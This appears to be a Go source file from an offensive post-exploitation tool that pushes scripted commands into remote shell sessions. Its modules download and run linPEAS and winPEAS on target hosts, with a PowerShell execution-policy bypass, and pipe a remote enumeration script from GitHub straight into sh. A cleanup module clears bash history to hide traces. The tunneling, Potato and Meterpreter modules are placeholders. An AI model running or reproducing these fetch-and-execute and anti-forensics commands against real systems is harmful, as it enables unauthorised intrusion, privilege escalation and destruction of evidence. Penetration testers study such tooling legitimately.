package modules

import (
	"fmt"
	"strings"
	"github.com/Aryma-f4/necromancy/core"
)

// Module represents an executable script or payload
type Module interface {
	Name() string
	Description() string
	Execute(s *core.Session) error
}

type ModuleManager struct {
	Modules map[string]Module
}

func NewModuleManager() *ModuleManager {
	mm := &ModuleManager{
		Modules: make(map[string]Module),
	}
	
	mm.Register(&AutoPeasModule{})
	mm.Register(&LinPeasModule{})
	mm.Register(&WinPeasModule{})
	mm.Register(&LseModule{})
	mm.Register(&PotatoModule{})
	mm.Register(&ChiselModule{})
	mm.Register(&LigoloModule{})
	mm.Register(&NgrokModule{})
	mm.Register(&MeterpreterModule{})
	mm.Register(&CleanupModule{})
	mm.Register(&TraitorModule{})
	mm.Register(&UACModule{})
	mm.Register(&PanixModule{})
	mm.Register(&LinuxProcmemdumpModule{})
	
	return mm
}

func (m *ModuleManager) Register(mod Module) {
	m.Modules[mod.Name()] = mod
}

func (m *ModuleManager) RunModule(name string, s *core.Session) error {
	mod, exists := m.Modules[name]
	if !exists {
		return fmt.Errorf("module '%s' not found", name)
	}
	return mod.Execute(s)
}

// ------------------------------------
// Example Implementations
// ------------------------------------

type AutoPeasModule struct{}
func (m *AutoPeasModule) Name() string { return "peass_auto" }
func (m *AutoPeasModule) Description() string { return "Automatically choose linPEAS or winPEAS based on the detected target OS" }
func (m *AutoPeasModule) Execute(s *core.Session) error {
	switch strings.ToLower(s.DetectedOS()) {
	case "windows":
		return (&WinPeasModule{}).Execute(s)
	case "linux":
		return (&LinPeasModule{}).Execute(s)
	default:
		return fmt.Errorf("unable to detect target OS yet; interact with the session first or run linpeas/winpeas manually")
	}
}

type LinPeasModule struct{}
func (m *LinPeasModule) Name() string { return "linpeas" }
func (m *LinPeasModule) Description() string { return "Downloads, executes, and cleans up linpeas.sh with safer fallbacks" }
func (m *LinPeasModule) Execute(s *core.Session) error {
	script := `echo "[*] Running linPEAS..."
TMP_LINPEAS="${TMPDIR:-/tmp}/linpeas.sh"
TMP_LINPEAS_LOG="${TMPDIR:-/tmp}/linpeas_output_$(date +%Y%m%d_%H%M%S 2>/dev/null || echo $$).log"
if command -v curl >/dev/null 2>&1; then
  curl -fsSL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o "$TMP_LINPEAS"
elif command -v wget >/dev/null 2>&1; then
  wget -qO "$TMP_LINPEAS" https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
else
  echo "[-] Neither curl nor wget is available"
  exit 1
fi
chmod +x "$TMP_LINPEAS"
if command -v tee >/dev/null 2>&1; then
  sh "$TMP_LINPEAS" 2>&1 | tee "$TMP_LINPEAS_LOG"
  STATUS=${PIPESTATUS[0]}
else
  sh "$TMP_LINPEAS" > "$TMP_LINPEAS_LOG" 2>&1
  STATUS=$?
  cat "$TMP_LINPEAS_LOG"
fi
rm -f "$TMP_LINPEAS"
echo "[*] linPEAS output saved to $TMP_LINPEAS_LOG"
echo "[*] linPEAS finished with status $STATUS"
`
	_, err := s.Write([]byte(script + "\n"))
	return err
}

type WinPeasModule struct{}
func (m *WinPeasModule) Name() string { return "winpeas" }
func (m *WinPeasModule) Description() string { return "Downloads, executes, and cleans up winPEAS with PowerShell/curl fallbacks" }
func (m *WinPeasModule) Execute(s *core.Session) error {
	script := `echo [*] Running winPEAS...
set TMP_WINPEAS=%TEMP%\winPEAS.bat
set TMP_WINPEAS_LOG=%TEMP%\winPEAS_output_%RANDOM%.log
powershell -NoProfile -ExecutionPolicy Bypass -Command "try { Invoke-WebRequest -UseBasicParsing 'https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEAS.bat' -OutFile $env:TEMP'\winPEAS.bat' } catch { exit 1 }" >nul 2>nul
if not exist "%TMP_WINPEAS%" curl.exe -fsSL https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEAS.bat -o "%TMP_WINPEAS%"
if not exist "%TMP_WINPEAS%" (
  echo [-] Failed to download winPEAS
  exit /b 1
)
call "%TMP_WINPEAS%" > "%TMP_WINPEAS_LOG%" 2>&1
set WINPEAS_STATUS=%ERRORLEVEL%
type "%TMP_WINPEAS_LOG%"
del /f /q "%TMP_WINPEAS%" >nul 2>nul
echo [*] winPEAS output saved to %TMP_WINPEAS_LOG%
echo [*] winPEAS finished with status %WINPEAS_STATUS%
`
	_, err := s.Write([]byte(script + "\n"))
	return err
}

type LseModule struct{}
func (m *LseModule) Name() string { return "lse" }
func (m *LseModule) Description() string { return "Linux Smart Enumeration" }
func (m *LseModule) Execute(s *core.Session) error {
	s.Write([]byte("curl -L https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh | sh\n"))
	return nil
}

type PotatoModule struct{}
func (m *PotatoModule) Name() string { return "potato" }
func (m *PotatoModule) Description() string { return "JuicyPotato / PrintSpoofer / GodPotato (Placeholder)" }
func (m *PotatoModule) Execute(s *core.Session) error {
	s.Write([]byte("echo '[*] Potato module execution placeholder'\n"))
	return nil
}

type ChiselModule struct{}
func (m *ChiselModule) Name() string { return "chisel" }
func (m *ChiselModule) Description() string { return "Chisel Tunneling" }
func (m *ChiselModule) Execute(s *core.Session) error {
	s.Write([]byte("echo '[*] Chisel module execution placeholder'\n"))
	return nil
}

type LigoloModule struct{}
func (m *LigoloModule) Name() string { return "ligolo" }
func (m *LigoloModule) Description() string { return "Ligolo-ng Tunneling" }
func (m *LigoloModule) Execute(s *core.Session) error {
	s.Write([]byte("echo '[*] Ligolo module execution placeholder'\n"))
	return nil
}

type NgrokModule struct{}
func (m *NgrokModule) Name() string { return "ngrok" }
func (m *NgrokModule) Description() string { return "Ngrok Port Forwarding" }
func (m *NgrokModule) Execute(s *core.Session) error {
	s.Write([]byte("echo '[*] Ngrok module execution placeholder'\n"))
	return nil
}

type MeterpreterModule struct{}
func (m *MeterpreterModule) Name() string { return "meterpreter" }
func (m *MeterpreterModule) Description() string { return "Upgrade to MSF Session (Placeholder)" }
func (m *MeterpreterModule) Execute(s *core.Session) error {
	s.Write([]byte("echo '[*] Meterpreter upgrade execution placeholder'\n"))
	return nil
}

type CleanupModule struct{}
func (m *CleanupModule) Name() string { return "cleanup" }
func (m *CleanupModule) Description() string { return "Clear history and traces" }
func (m *CleanupModule) Execute(s *core.Session) error {
	s.Write([]byte("cat /dev/null > ~/.bash_history && history -c && echo '[+] Cleanup done'\n"))
	return nil
}
